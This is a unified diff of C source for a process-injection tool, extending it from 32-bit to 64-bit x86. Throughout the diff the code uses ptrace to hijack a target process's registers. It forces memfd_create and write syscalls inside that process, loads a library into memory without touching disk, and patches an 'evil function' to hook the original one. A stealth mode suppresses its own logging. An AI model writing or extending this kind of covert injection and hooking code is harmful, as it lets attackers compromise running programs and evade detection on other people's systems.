@@ -39,19 +39,37 @@ typedef unsigned char uchar_t;
 #define WAITPID_TIMEOUT_SEC 10
 #define MAX_SINGLESTEP_ITERATIONS 20
 
+/* Architecture-specific syscall numbers */
+#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
+#ifndef SYS_memfd_create
+#define SYS_memfd_create 319
+#endif
+#ifndef SYS_mmap
+#define SYS_mmap 9
+#endif
+#ifndef SYS_open
+#define SYS_open 2
+#endif
+#else /* 32-bit */
 #ifndef SYS_memfd_create
 #define SYS_memfd_create 356
+#endif
 #endif
 
 #ifndef MFD_CLOEXEC
 #define MFD_CLOEXEC 0x0001U
 #endif
 
+/* ELF relocation type for x86-64 */
+#ifndef R_X86_64_JUMP_SLOT
+#define R_X86_64_JUMP_SLOT 7
+#endif
+
 struct ae_sym {
 	int count;
 	char name[MAXBUF];
 	int index;
-	uint32_t offset;
+	uintptr_t offset;  /* Use pointer-sized offset for 32/64-bit compatibility */
 };
 
 struct ae_sym_info {
@@ -96,7 +114,7 @@ static void ae_show_progress_bar(ulong_t current, ulong_t total, const char * st
 static inline void ae_ptrace_cpy_from(ulong_t * dst, ulong_t src, size_t size, int pid);
 static inline void ae_ptrace_cpy_to(ulong_t dst, ulong_t * src, size_t size, int pid);
 static int ae_waitpid_with_timeout(pid_t pid, int *status, int timeout_sec, const char *context);
-static int ae_singlestep_with_timeout(int pid, int max_iterations, int timeout_sec, const char *context, unsigned int syscall_number, unsigned int *result);
+static int ae_singlestep_with_timeout(int pid, int max_iterations, int timeout_sec, const char *context, uintptr_t syscall_number, uintptr_t *result);
 
 // wait for process to stop with timeout so we dont hang forever
 // i have no fucking idea why this fixed it but it did
@@ -135,25 +153,22 @@ static int ae_waitpid_with_timeout(pid_t pid, int *status, int timeout_sec, cons
     }
 }
 
-// this shit is diabolical im so fucking sorry
-// single steps through syscalls to detect when they complete by watching register changes
-// spent 4 hours on a typo im going to bed fuck this
+/* single steps through syscalls to detect when they complete by watching register changes */
 static int ae_singlestep_with_timeout(int pid, int max_iterations, int timeout_sec,
-                                      const char *context, unsigned int syscall_number, unsigned int *result) {
+                                      const char *context, uintptr_t syscall_number, uintptr_t *result) {
     struct timeval start_time, current_time;
     gettimeofday(&start_time, NULL);
     int step_status;
     struct user_regs_struct reg;
     int iteration = 0;
     int syscall_started = 0;
-    unsigned int initial_eax = 0;
 
     if (!ae_stealth_mode)
-        ae_log(AE_LOG_DEBUG, "[SINGLESTEP] Starting single-step for %s (syscall: %u, max_iterations: %d, timeout: %d sec)",
-               context ? context : "unknown", syscall_number, max_iterations, timeout_sec);
+        ae_log(AE_LOG_DEBUG, "[SINGLESTEP] Starting single-step for %s (syscall: %lu, max_iterations: %d, timeout: %d sec)",
+               context ? context : "unknown", (unsigned long)syscall_number, max_iterations, timeout_sec);
 
     for (iteration = 0; iteration < max_iterations; iteration++) {
-        /* Check timeout before each iteration */
+        /* check timeout before each iteration */
         gettimeofday(&current_time, NULL);
         double elapsed = (current_time.tv_sec - start_time.tv_sec) +
                         (current_time.tv_usec - start_time.tv_usec) / 1000000.0;
@@ -170,7 +185,7 @@ static int ae_singlestep_with_timeout(int pid, int max_iterations, int timeout_s
             return -1;
         }
 
-        /* Wait for single-step with timeout */
+        /* wait for singlestep with timeout */
         pid_t wait_result = ae_waitpid_with_timeout(pid, &step_status, timeout_sec,
                                                      context ? context : "single-step");
 
@@ -191,7 +206,7 @@ static int ae_singlestep_with_timeout(int pid, int max_iterations, int timeout_s
             return -1;
         }
 
-        /* Validate process status */
+        /* validate process status */
         if (WIFEXITED(step_status)) {
             ae_log(AE_LOG_ERROR, "[SINGLESTEP] Process exited during iteration %d (exit status: %d)",
                    iteration, WEXITSTATUS(step_status));
@@ -216,34 +231,58 @@ static int ae_singlestep_with_timeout(int pid, int max_iterations, int timeout_s
             return -1;
         }
 
-        // detect when syscall starts (eax has syscall num) and when it finishes (back in userspace with result)
+#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
+        /* 64-bit: detect when syscall starts (rax has syscall num) and when it finishes */
         if (!syscall_started) {
-            if ((unsigned int)reg.eax == syscall_number) {
+            if ((uintptr_t)reg.rax == syscall_number) {
                 syscall_started = 1;
-                initial_eax = reg.eax;
                 if (!ae_stealth_mode)
-                    ae_log(AE_LOG_DEBUG, "[SINGLESTEP] Syscall %u started at iteration %d (EIP: 0x%lx)",
-                           syscall_number, iteration, reg.eip);
+                    ae_log(AE_LOG_DEBUG, "[SINGLESTEP] Syscall %lu started at iteration %d (RIP: 0x%lx)",
+                           (unsigned long)syscall_number, iteration, (unsigned long)reg.rip);
             }
         } else {
-            // kernel addrs are high (0xf7xxxxxx) user addrs are lower - check if we're back in userspace
-            int in_kernel = (reg.eip & 0xff000000) == 0xf7000000;
-
-            if (!in_kernel && (unsigned int)reg.eax != syscall_number) {
-                *result = (unsigned int)reg.eax;
+            /* 64-bit: don't use the 32-bit kernel address check; just check if rax changed */
+            if ((uintptr_t)reg.rax != syscall_number) {
+                *result = (uintptr_t)reg.rax;
                 if (!ae_stealth_mode)
-                    ae_log(AE_LOG_DEBUG, "[SINGLESTEP] Syscall %u completed at iteration %d: result=0x%x (EIP: 0x%lx)",
-                           syscall_number, iteration, *result, reg.eip);
+                    ae_log(AE_LOG_DEBUG, "[SINGLESTEP] Syscall %lu completed at iteration %d: result=0x%lx (RIP: 0x%lx)",
+                           (unsigned long)syscall_number, iteration, (unsigned long)*result, (unsigned long)reg.rip);
                 return 0;
             }
         }
 
         if (!ae_stealth_mode && (iteration % 5 == 0 || iteration < 3))
-            ae_log(AE_LOG_DEBUG, "[SINGLESTEP] Iteration %d: EAX=0x%x, EIP=0x%lx",
-                   iteration, reg.eax, reg.eip);
+            ae_log(AE_LOG_DEBUG, "[SINGLESTEP] Iteration %d: RAX=0x%lx, RIP=0x%lx",
+                   iteration, (unsigned long)reg.rax, (unsigned long)reg.rip);
+#else
+        /* 32-bit: detect when syscall starts (eax has syscall num) and when it finishes (back in userspace with result) */
+        if (!syscall_started) {
+            if ((unsigned int)reg.eax == syscall_number) {
+                syscall_started = 1;
+                if (!ae_stealth_mode)
+                    ae_log(AE_LOG_DEBUG, "[SINGLESTEP] Syscall %u started at iteration %d (EIP: 0x%lx)",
+                           (unsigned int)syscall_number, iteration, (unsigned long)reg.eip);
+            }
+        } else {
+            /* kernel addrs are high (0xf7xxxxxx) user addrs are lower, check if we are back in userspace */
+            int in_kernel = (reg.eip & 0xff000000) == 0xf7000000;
+
+            if (!in_kernel && (unsigned int)reg.eax != syscall_number) {
+                *result = (uintptr_t)reg.eax;
+                if (!ae_stealth_mode)
+                    ae_log(AE_LOG_DEBUG, "[SINGLESTEP] Syscall %u completed at iteration %d: result=0x%x (EIP: 0x%lx)",
+                           (unsigned int)syscall_number, iteration, (unsigned int)*result, (unsigned long)reg.eip);
+                return 0;
+            }
+        }
+
+        if (!ae_stealth_mode && (iteration % 5 == 0 || iteration < 3))
+            ae_log(AE_LOG_DEBUG, "[SINGLESTEP] Iteration %d: EAX=0x%lx, EIP=0x%lx",
+                   iteration, (unsigned long)reg.eax, (unsigned long)reg.eip);
+#endif
     }
 
-    ae_log(AE_LOG_ERROR, "[SINGLESTEP] Syscall %u did not complete within %d iterations", syscall_number, max_iterations);
+    ae_log(AE_LOG_ERROR, "[SINGLESTEP] Syscall %lu did not complete within %d iterations", (unsigned long)syscall_number, max_iterations);
     return -1;
 }
 
@@ -271,7 +310,6 @@ static int ae_is_address_mapped(int pid, ulong_t addr, size_t size) {
 }
 
 // make sure process is stopped before we fuck with it
-// checks if process is already stopped or sends SIGSTOP to stop it
 static int ae_ensure_stopped(int pid) {
     int status;
     if (waitpid(pid, &status, WNOHANG) > 0 && WIFSTOPPED(status))
@@ -302,8 +340,7 @@ static int ae_ensure_stopped(int pid) {
         return -1;
     return 0;
 }
-// look at this clean code just look at it
-// ship it no notes
+// look at this clean code just look at it its beautiful
 // draws a progress bar on stderr if its a tty shows how much we searched
 static void
 ae_show_progress_bar (ulong_t current,
@@ -347,16 +384,15 @@ ae_show_progress_bar (ulong_t current,
 
 static inline void ae_ptrace_cpy_to(ulong_t dst, ulong_t * src, size_t size, int pid);
 
-// byte signatures for finding our evil function and the transfer code pattern
-// autogenerated by makefile
-#ifndef AE_SIGNATURES_H
-#define AE_SIGNATURES_H
-static char const evilsig[] = "\x55\x89\xe5\x56\x53\x83\xec\x10";
-static char const tc[] = "\xc7\x45\xf4\x00";
+/* byte signatures for finding our evil function and the transfer code pattern
+ * autogenerated by makefile - include the appropriate header based on architecture */
+#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
+#include "ae_signatures_64.h"
+#else
+#include "ae_signatures.h"
 #endif
 
 
-// read library from /lib into memory buffer
 // its not pretty but it gets the job done fuck it
 // opens /lib/libname reads the whole file into memory and returns it
 static uchar_t *
@@ -404,14 +440,13 @@ ae_read_library_file (char * libname, size_t * lib_size)
 }
 
 
-// YAY IT FUCKING WORKS
-// i finally fixed that bug and ive never felt more powerful
-// hijack target process to call memfd_create by setting registers and single stepping through syscall
+/* YAY IT FUCKING WORKS
+ * hijack target process to call memfd_create by setting registers and single stepping through syscall */
 static int
 ae_force_memfd_create (int pid, ulong_t sysenter, const char * name)
 {
 	struct user_regs_struct reg;
-	int i, memfd = -1;
+	int memfd = -1;
 	ulong_t name_addr;
 	char saved_data[MAXBUF];
 	size_t name_len = strlen(name) + 1;
@@ -428,43 +463,61 @@ ae_force_memfd_create (int pid, ulong_t sysenter, const char * name)
 		return -1;
 	}
 
-	// use stack for memfd name string since its always writable
-	// 32bit linux stack usually in upper addr space (0x80000000+)
-	// dont touch this shit its held together by thoughts and prayers
-	// calculate a safe address on the stack to write the memfd name string
+#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
+	/* 64-bit: use rsp, simpler stack check since 64-bit user addresses vary widely */
 	ulong_t stack_limit = 0x1000;
-	if (reg.esp < 0x80000000) {
+	ulong_t stack_ptr = reg.rsp;
+	
+	if (stack_ptr < stack_limit + name_len + 256) {
+		ae_log(AE_LOG_ERROR, "Stack pointer too low: 0x%lx", stack_ptr);
+		return -1;
+	}
+	
+	name_addr = (stack_ptr & ~0x7) - (name_len + 64);  /* 8-byte aligned on 64-bit */
+	
+	if (!ae_stealth_mode)
+		ae_log(AE_LOG_DEBUG, "Using stack address 0x%lx for memfd name (rsp: 0x%lx)", name_addr, stack_ptr);
+#else
+	/* 32-bit: use esp, 32-bit linux stack usually in upper addr space (0x80000000+) */
+	ulong_t stack_limit = 0x1000;
+	ulong_t stack_ptr = reg.esp;
+	if (stack_ptr < 0x80000000) {
 		stack_limit = 0x1000;
 	} else {
 		stack_limit = 0x40000000;
 	}
 	
-	if (reg.esp < stack_limit + name_len + 256) {
-		ae_log(AE_LOG_ERROR, "Stack pointer too low: 0x%lx", reg.esp);
+	if (stack_ptr < stack_limit + name_len + 256) {
+		ae_log(AE_LOG_ERROR, "Stack pointer too low: 0x%lx", stack_ptr);
 		return -1;
 	}
 	
-	name_addr = (reg.esp & ~0x3) - (name_len + 64);
+	name_addr = (stack_ptr & ~0x3) - (name_len + 64);
 	
 	if (name_addr < stack_limit) {
 		ae_log(AE_LOG_ERROR, "Calculated stack address too low: 0x%lx (esp: 0x%lx, limit: 0x%lx)", 
-		       name_addr, reg.esp, stack_limit);
+		       name_addr, stack_ptr, stack_limit);
 		return -1;
 	}
 	
 	if (!ae_stealth_mode)
-		ae_log(AE_LOG_DEBUG, "Using stack address 0x%lx for memfd name (esp: 0x%lx)", name_addr, reg.esp);
+		ae_log(AE_LOG_DEBUG, "Using stack address 0x%lx for memfd name (esp: 0x%lx)", name_addr, stack_ptr);
+#endif
 	
 	errno = 0;
-	long test_read = ptrace(PTRACE_PEEKTEXT, pid, name_addr);
+	long test_read = ptrace(PTRACE_PEEKTEXT, pid, name_addr, NULL);
 	if (test_read == -1 && errno) {
 		ae_log(AE_LOG_ERROR, "Cannot read from stack address 0x%lx: %s", name_addr, strerror(errno));
-		name_addr = (reg.esp & ~0x3) - 256;
+#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
+		name_addr = (stack_ptr & ~0x7) - 256;
+#else
+		name_addr = (stack_ptr & ~0x3) - 256;
+#endif
 		if (name_addr < stack_limit) {
 			ae_log(AE_LOG_ERROR, "Alternative stack address also too low: 0x%lx", name_addr);
 			return -1;
 		}
-		test_read = ptrace(PTRACE_PEEKDATA, pid, name_addr);
+		test_read = ptrace(PTRACE_PEEKDATA, pid, name_addr, NULL);
 		if (test_read == -1 && errno) {
 			ae_log(AE_LOG_ERROR, "Cannot read from alternative stack address 0x%lx: %s", name_addr, strerror(errno));
 			return -1;
@@ -499,14 +552,31 @@ ae_force_memfd_create (int pid, ulong_t sysenter, const char * name)
 	if (!ae_stealth_mode)
 		ae_log(AE_LOG_DEBUG, "Verified memfd name written successfully");
 
+#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
+	/* 64-bit: save rax, rdi, rsi, rdx, rip */
+	unsigned long long orig_rax = reg.rax;
+	unsigned long long orig_rdi = reg.rdi;
+	unsigned long long orig_rsi = reg.rsi;
+	unsigned long long orig_rdx = reg.rdx;
+	unsigned long long orig_rip = reg.rip;
+
+	/* 64-bit syscall convention: rax=num, rdi=name_addr, rsi=flags, rip=syscall_addr */
+	if (!ae_stealth_mode)
+		ae_log(AE_LOG_DEBUG, "Setting up memfd_create syscall: RAX=0x%x, RDI=0x%lx (name_addr), RSI=0x%x, RIP=0x%lx", 
+		       SYS_memfd_create, name_addr, MFD_CLOEXEC, sysenter);
+	reg.rax = SYS_memfd_create;
+	reg.rdi = name_addr;
+	reg.rsi = MFD_CLOEXEC;
+	reg.rip = sysenter;
+#else
+	/* 32-bit: save eax, ebx, ecx, edx, eip */
 	long orig_eax = reg.eax;
 	long orig_ebx = reg.ebx;
 	long orig_ecx = reg.ecx;
 	long orig_edx = reg.edx;
 	long orig_eip = reg.eip;
 
-	// set up registers for memfd_create syscall: eax=syscall num ebx=name addr ecx=flags eip=sysenter
-	// we hijack the process by setting its registers then single stepping through the syscall
+	/* 32-bit syscall convention: eax=num, ebx=name_addr, ecx=flags, eip=sysenter */
 	if (!ae_stealth_mode)
 		ae_log(AE_LOG_DEBUG, "Setting up memfd_create syscall: EAX=0x%x, EBX=0x%lx (name_addr), ECX=0x%x, EIP=0x%lx", 
 		       SYS_memfd_create, name_addr, MFD_CLOEXEC, sysenter);
@@ -514,6 +584,7 @@ ae_force_memfd_create (int pid, ulong_t sysenter, const char * name)
 	reg.ebx = name_addr;
 	reg.ecx = MFD_CLOEXEC;
 	reg.eip = sysenter;
+#endif
 
 	if (ptrace(PTRACE_SETREGS, pid, NULL, &reg) == -1) {
 		ae_log(AE_LOG_ERROR, "Failed to set registers: %s", strerror(errno));
@@ -524,10 +595,9 @@ ae_force_memfd_create (int pid, ulong_t sysenter, const char * name)
 		ae_log(AE_LOG_DEBUG, "Registers set successfully, ready to execute syscall");
 
 	if (!ae_stealth_mode)
-		ae_log(AE_LOG_DEBUG, "Executing memfd_create syscall via single-step (sysenter: 0x%lx)", sysenter);
+		ae_log(AE_LOG_DEBUG, "Executing memfd_create syscall via single-step (syscall_addr: 0x%lx)", sysenter);
 	
-	int step_status;
-	unsigned int memfd_result;
+	uintptr_t memfd_result;
 	int singlestep_result = ae_singlestep_with_timeout(pid, MAX_SINGLESTEP_ITERATIONS,
 	                                                    SINGLESTEP_TIMEOUT_SEC,
 	                                                    "memfd_create", SYS_memfd_create, &memfd_result);
@@ -540,14 +610,14 @@ ae_force_memfd_create (int pid, ulong_t sysenter, const char * name)
 
 	memfd = (int)memfd_result;
 	if (!ae_stealth_mode)
-		ae_log(AE_LOG_DEBUG, "memfd_create syscall completed: result=0x%x (memfd=%d)", memfd_result, memfd);
+		ae_log(AE_LOG_DEBUG, "memfd_create syscall completed: result=0x%lx (memfd=%d)", (unsigned long)memfd_result, memfd);
 
 	if (memfd < 0) {
 		ae_log(AE_LOG_ERROR, "memfd_create failed: %d (errno: %s)", memfd, strerror(errno));
-		char verify_buf[MAXBUF] = {0};
-		ae_ptrace_cpy_from((ulong_t*)verify_buf, name_addr, name_len, pid);
+		char vbuf[MAXBUF] = {0};
+		ae_ptrace_cpy_from((ulong_t*)vbuf, name_addr, name_len, pid);
 		if (!ae_stealth_mode)
-			ae_log(AE_LOG_DEBUG, "Name at 0x%lx contains: '%s'", name_addr, verify_buf);
+			ae_log(AE_LOG_DEBUG, "Name at 0x%lx contains: '%s'", name_addr, vbuf);
 		ae_ptrace_cpy_to(name_addr, (ulong_t*)saved_data, name_len + 16, pid);
 		return -1;
 	}
@@ -557,20 +627,27 @@ ae_force_memfd_create (int pid, ulong_t sysenter, const char * name)
 
 	ae_ptrace_cpy_to(name_addr, (ulong_t*)saved_data, name_len + 16, pid);
 
+#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
+	reg.rax = orig_rax;
+	reg.rdi = orig_rdi;
+	reg.rsi = orig_rsi;
+	reg.rdx = orig_rdx;
+	reg.rip = orig_rip;
+#else
 	reg.eax = orig_eax;
 	reg.ebx = orig_ebx;
 	reg.ecx = orig_ecx;
 	reg.edx = orig_edx;
 	reg.eip = orig_eip;
+#endif
 	ptrace(PTRACE_SETREGS, pid, NULL, &reg);
 
 	return memfd;
 }
 
 
-// write library data to memfd in chunks using write syscall hijacking
-// future me is gonna hate present me for this shit
-// writes data to memfd by copying chunks to target memory then hijacking write syscall
+/* future me is gonna hate present me for this shit
+ * writes data to memfd by copying chunks to target memory then hijacking write syscall */
 static int
 ae_write_to_memfd (int pid, ulong_t sysenter, int memfd, uchar_t * data, size_t data_size)
 {
@@ -578,34 +655,50 @@ ae_write_to_memfd (int pid, ulong_t sysenter, int memfd, uchar_t * data, size_t 
 	size_t offset = 0;
 	size_t chunk_size;
 	size_t write_buf_size = 4096;
-	int i;
 	ssize_t written;
 
 	ptrace(PTRACE_GETREGS, pid, NULL, &reg);
 
+#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
+	unsigned long long orig_rax = reg.rax;
+	unsigned long long orig_rdi = reg.rdi;
+	unsigned long long orig_rsi = reg.rsi;
+	unsigned long long orig_rdx = reg.rdx;
+	unsigned long long orig_rip = reg.rip;
+#else
 	long orig_eax = reg.eax;
 	long orig_ebx = reg.ebx;
 	long orig_ecx = reg.ecx;
 	long orig_edx = reg.edx;
 	long orig_eip = reg.eip;
+#endif
 
 	while (offset < data_size) {
 		chunk_size = (data_size - offset > write_buf_size) ? write_buf_size : (data_size - offset);
 
-		// copy chunk to target process memory first
+		/* copy chunk to target process memory first */
 		ae_ptrace_cpy_to(ae_data_base, (ulong_t*)(data + offset), chunk_size, pid);
 
-		// set up write syscall: write(memfd, data_base, chunk_size)
+#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
+		/* 64-bit syscall: write(fd, buf, count) → rdi, rsi, rdx */
+		reg.rax = SYS_write;
+		reg.rdi = memfd;
+		reg.rsi = ae_data_base;
+		reg.rdx = chunk_size;
+		reg.rip = sysenter;
+#else
+		/* 32-bit syscall: write(fd, buf, count) → ebx, ecx, edx */
 		reg.eax = SYS_write;
 		reg.ebx = memfd;
 		reg.ecx = ae_data_base;
 		reg.edx = chunk_size;
 		reg.eip = sysenter;
+#endif
 
 		ptrace(PTRACE_SETREGS, pid, NULL, &reg);
 
 		written = -1;
-		unsigned int write_result;
+		uintptr_t write_result;
 		char context_buf[64];
 		snprintf(context_buf, sizeof(context_buf), "write(memfd=%d, offset=%zu)", memfd, offset);
 
@@ -616,7 +709,7 @@ ae_write_to_memfd (int pid, ulong_t sysenter, int memfd, uchar_t * data, size_t 
 				ae_log(AE_LOG_DEBUG, "write syscall completed: wrote %ld bytes", written);
 		}
 
-		if (written != chunk_size) {
+		if (written != (ssize_t)chunk_size) {
 			ae_log(AE_LOG_ERROR, "write to memfd failed: wrote %ld of %zu bytes", written, chunk_size);
 			return -1;
 		}
@@ -626,11 +719,19 @@ ae_write_to_memfd (int pid, ulong_t sysenter, int memfd, uchar_t * data, size_t 
 			ae_log(AE_LOG_DEBUG, "Wrote %zu/%zu bytes to memfd", offset, data_size);
 	}
 
+#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
+	reg.rax = orig_rax;
+	reg.rdi = orig_rdi;
+	reg.rsi = orig_rsi;
+	reg.rdx = orig_rdx;
+	reg.rip = orig_rip;
+#else
 	reg.eax = orig_eax;
 	reg.ebx = orig_ebx;
 	reg.ecx = orig_ecx;
 	reg.edx = orig_edx;
 	reg.eip = orig_eip;
+#endif
 	ptrace(PTRACE_SETREGS, pid, NULL, &reg);
 
 	if (!ae_stealth_mode)
@@ -641,7 +742,6 @@ ae_write_to_memfd (int pid, ulong_t sysenter, int memfd, uchar_t * data, size_t 
 
 // read memory from target process using ptrace word by word
 // why the fuck did i make this shit
-// reads memory from target process one word at a time using PEEKTEXT
 static inline void
 ae_ptrace_cpy_from (ulong_t * dst,
 			ulong_t src,
@@ -667,10 +767,9 @@ ae_ptrace_cpy_from (ulong_t * dst,
 	errno = 0;
 }
 
-// search memory for sysenter instruction (0x0f 0x34) which we use to hijack syscalls
-// search backwards 5 bytes from match to get to start of syscall wrapper
-// im choosing to ignore the 14 fucking warnings
-// searches memory for the sysenter instruction so we can hijack syscalls
+/* search memory for syscall instruction which we use to hijack syscalls
+ * 64-bit: syscall (0x0f 0x05)
+ * 32-bit: sysenter (0x0f 0x34) */
 static ulong_t
 ae_find_sysenter (int pid,
 		  ulong_t start,
@@ -698,7 +797,14 @@ ae_find_sysenter (int pid,
 
 	ulong_t total = limit - start;
 	ulong_t bytes_searched = 0;
+
+#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
+	const char *progress_status = "Searching for syscall...";
+	const uint8_t instr_byte2 = 0x05;  /* syscall = 0F 05 */
+#else
 	const char *progress_status = "Searching for sysenter...";
+	const uint8_t instr_byte2 = 0x34;  /* sysenter = 0F 34 */
+#endif
 
 	if (!ae_stealth_mode)
 		ae_show_progress_bar(0, total, progress_status, 0);
@@ -713,17 +819,25 @@ ae_find_sysenter (int pid,
 		ae_ptrace_cpy_from((ulong_t*)buf, addr, read_size, pid);
 		if (errno == 0) {
 			bytes_searched += read_size;
-			// look for 0x0f 0x34 which is the sysenter instruction
+			/* look for 0x0f 0x05 (syscall) or 0x0f 0x34 (sysenter) */
 			for (size_t i = 0; i + 1 < read_size; i++) {
-				if (buf[i] == 0x0f && buf[i + 1] == 0x34) {
+				if (buf[i] == 0x0f && buf[i + 1] == instr_byte2) {
 					found = addr + i;
-					// go back 5 bytes to get to start of syscall wrapper
+#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
+					/* 64-bit: return the syscall instruction address directly */
+					if (!ae_stealth_mode) {
+						ae_show_progress_bar(bytes_searched, total, "Syscall found!", 0);
+						ae_show_progress_bar(total, total, "Syscall found!", 1);
+					}
+#else
+					/* 32-bit: go back 5 bytes to get to start of syscall wrapper */
 					if (found >= 5)
 						found -= 5;
 					if (!ae_stealth_mode) {
 						ae_show_progress_bar(bytes_searched, total, "Sysenter found!", 0);
 						ae_show_progress_bar(total, total, "Sysenter found!", 1);
 					}
+#endif
 					break;
 				}
 			}
@@ -736,13 +850,13 @@ ae_find_sysenter (int pid,
 	}
 
 	if (!found && !ae_stealth_mode)
-		ae_show_progress_bar(bytes_searched, total, "Sysenter not found", 1);
+		ae_show_progress_bar(bytes_searched, total, "Instruction not found", 1);
 
 	return found;
 }
 
 
-// write memory to target process word by word using ptrace
+
 // everything is broken and i am the reason why fuck me
 // writes memory to target process one word at a time using POKETEXT
 static inline void
@@ -769,7 +883,6 @@ ae_ptrace_cpy_to (ulong_t dst,
 }
 
 
-// patch transfer code with address of original function so we can call it from our hook
 // patches the mov instruction in our evil function to point to the original function
 static void
 ae_inject_transfer_code (int pid, ulong_t target_addr, ulong_t newval)
@@ -781,8 +894,6 @@ ae_inject_transfer_code (int pid, ulong_t target_addr, ulong_t newval)
 
 // ITS FUCKING ALIVEEEEE
 // its alive ITS ALIVEEEEE
-// phantom load: create memfd in target process and write library to it from RAM
-// no disk traces just pure memory fuckery
 // reads library from disk creates memfd in target process writes library to memfd all in memory
 static int
 ae_phantom_load (int pid, char * libname, ulong_t sysenter, int * memfd_out)
@@ -858,9 +969,7 @@ ae_dump_buf (uchar_t * buf, size_t size)
 }
 
 
-// i am actually a genius and nobody can tell me otherwise
-// mmap library from memfd using phantom load - no shellcode just pure syscall hijacking
-// this code belongs in a museum of what not to do
+/* i am actually a genius and nobody can tell me otherwise */
 static int 
 ae_mmap_library (int pid, 
 				char * libname,
@@ -868,18 +977,22 @@ ae_mmap_library (int pid,
 				struct ae_segments * segs)
 {
 	struct user_regs_struct reg;
-	long eip, esp, offset,
-         eax, ebx, ecx, edx;
-	int i, fd, memfd, status;
+	int fd, memfd;
 	char library_string[MAXBUF] = {0};
 	char orig_ds[MAXBUF] = {0};
 	char buf[MAXBUF] = {0};
 	ulong_t sysenter = 0;
 	size_t search_stages[] = {0x1000, 0x4000, 0x10000};
 	size_t sysenter_chunk = 1024;
-	long syscall_eip;
 
-	// refactoring this was a mistake i want to go home fuck this
+#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
+	unsigned long long orig_rip, orig_rsp, orig_rax, orig_rdi, orig_rsi, orig_rdx, orig_r10, orig_r8, orig_r9;
+#else
+	long eip, esp, eax, ebx, ecx, edx;
+#endif
+	long offset;
+
+	/* refactoring this was a mistake i want to go home */
 	if (ae_ensure_stopped(pid) == -1) {
 		ae_log(AE_LOG_ERROR, "Target not stopped before mmap_library initial");
 		return -1;
@@ -889,15 +1002,26 @@ ae_mmap_library (int pid,
 		return -1;
 	}
 
+#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
+	orig_rip = reg.rip;
+	orig_rsp = reg.rsp;
+	orig_rax = reg.rax;
+	orig_rdi = reg.rdi;
+	orig_rsi = reg.rsi;
+	orig_rdx = reg.rdx;
+	orig_r10 = reg.r10;
+	orig_r8 = reg.r8;
+	orig_r9 = reg.r9;
+#else
 	eip = reg.eip;
 	esp = reg.esp;
 	eax = reg.eax;
 	ebx = reg.ebx;
 	ecx = reg.ecx;
 	edx = reg.edx;
+#endif
 
 	// find sysenter in libc since its syscall wrapper always has it
-	// read /proc/pid/maps to find libc executable mappings then search for sysenter
 	char maps_path[64];
 	FILE *maps_file;
 	char line[1024];
@@ -926,34 +1050,58 @@ ae_mmap_library (int pid,
 	}
 	
 	if (!sysenter) {
+#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
+		ulong_t search_start = (reg.rip > 0x1000) ? (reg.rip - 0x1000) : 0x1000;
+		ulong_t search_end = reg.rip + 0x1000;
+		
+		if (!ae_stealth_mode)
+			ae_log(AE_LOG_DEBUG, "Libc search failed, trying around RIP 0x%lx", (unsigned long)reg.rip);
+#else
 		ulong_t search_start = (reg.eip > 0x1000) ? (reg.eip - 0x1000) : 0x1000;
 		ulong_t search_end = reg.eip + 0x1000;
 		
 		if (!ae_stealth_mode)
-			ae_log(AE_LOG_DEBUG, "Libc search failed, trying around EIP 0x%lx", reg.eip);
+			ae_log(AE_LOG_DEBUG, "Libc search failed, trying around EIP 0x%lx", (unsigned long)reg.eip);
+#endif
 		
 		sysenter = ae_find_sysenter(pid, search_start, search_end, search_end - search_start, sysenter_chunk);
 	}
 
 	if (!sysenter) {
+#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
+		ae_log(AE_LOG_ERROR, "Unable to find syscall instruction in memory");
+#else
 		ae_log(AE_LOG_ERROR, "Unable to find sysenter instruction in memory");
+#endif
 		return -1;
 	}
 
 	if (!ae_stealth_mode)
-		ae_log(AE_LOG_DEBUG, "Sysenter found: 0x%lx", sysenter);
+		ae_log(AE_LOG_DEBUG, "Syscall instruction found: 0x%lx", sysenter);
 
 	if (ptrace(PTRACE_GETREGS, pid, NULL, &reg) == -1) {
 		ae_log(AE_LOG_ERROR, "Failed to get registers: %s", strerror(errno));
 		return -1;
 	}
 	
+#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
+	orig_rip = reg.rip;
+	orig_rsp = reg.rsp;
+	orig_rax = reg.rax;
+	orig_rdi = reg.rdi;
+	orig_rsi = reg.rsi;
+	orig_rdx = reg.rdx;
+	orig_r10 = reg.r10;
+	orig_r8 = reg.r8;
+	orig_r9 = reg.r9;
+#else
 	eip = reg.eip;
 	esp = reg.esp;
 	eax = reg.eax;
 	ebx = reg.ebx;
 	ecx = reg.ecx;
 	edx = reg.edx;
+#endif
 	
 	if (ptrace(PTRACE_SETOPTIONS, pid, NULL, PTRACE_O_TRACESYSGOOD) == -1) {
 		if (!ae_stealth_mode)
@@ -971,10 +1119,14 @@ ae_mmap_library (int pid,
 	if (!ae_stealth_mode)
 		ae_log(AE_LOG_DEBUG, "Library loaded in RAM, accessible via: %s", library_string);
 
-	// calculate address on stack to store the /proc/self/fd/memfd path string
+	/* calculate address on stack to store the /proc/self/fd/memfd path string */
 	ulong_t stack_limit = 0x1000;
 	size_t str_len = strlen(library_string) + 1;
+#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
+	ulong_t string_addr = (reg.rsp & ~0x7) - (str_len + 64);  /* 8-byte aligned on 64-bit */
+#else
 	ulong_t string_addr = (reg.esp & ~0x3) - (str_len + 64);
+#endif
 	
